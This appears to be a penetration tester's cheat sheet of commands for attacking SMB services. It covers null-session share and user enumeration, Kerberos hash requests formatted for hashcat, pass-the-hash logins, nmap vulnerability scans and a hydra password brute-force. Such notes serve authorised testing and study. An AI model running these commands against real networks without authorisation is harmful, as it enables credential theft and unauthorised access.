# port: 137,138,139

Notes
# """#While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan #{LHOST}
smbmap -H #{LHOST}
smbmap -H #{LHOST} -u null -p null
smbclient -N -L //#{LHOST}
smbclient -N //#{LHOST}/ --option="client min protocol"=LANMAN1
rpcclient #{LHOST}
rpcclient -U "" #{LHOST}
crackmapexec smb #{LHOST}
crackmapexec smb #{LHOST} --pass-pol -u "" -p ""
GetADUsers.py -dc-ip #{LHOST} "#{Domain_Name}/" -all
GetNPUsers.py -dc-ip #{LHOST} -request "#{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip #{LHOST} -request "#{Domain_Name}/"
getArch.py -target #{LHOST}

With Creds
smbmap -H #{LHOST} -u #{USER} -p #{PWD}
smbclient -h "\\\\#{LHOST}\\\" -U #{Domain_Name} -W #{USER} -l #{LHOST}
smbclient -h "\\\\#{LHOST}\\\" -U #{Domain_Name} -W #{USER} -l #{LHOST} --pw-nt-hash `hash`
crackmapexec smb #{LHOST} -u #{USER} -p #{PWD} --shares
GetADUsers.py #{Domain_Name}/#{USER}:#{PWD} -all
GetNPUsers.py #{Domain_Name}/#{USER}:#{PWD} -request -format hashcat
GetUserSPNs.py #{Domain_Name}/#{USER}:#{PWD} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb
"""

# General SMB Scan
# desc:Enum4Linux
enum4linux -a #{LHOST}

# SMB Vuln Scan With Nmap
# desc:Nmap SMB Scan 1
nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse #{LHOST}

# SMB Vuln Scan With Nmap (Less Specific)
# desc:Nmap Smb Scan 2
nmap --script smb-vuln* -Pn -p 139,445 #{LHOST}

# Need User
# desc:Hydra Brute Force
hydra -t 1 -V -f -l #{USER} -P #{Big_Passwordlist} #{LHOST} smb

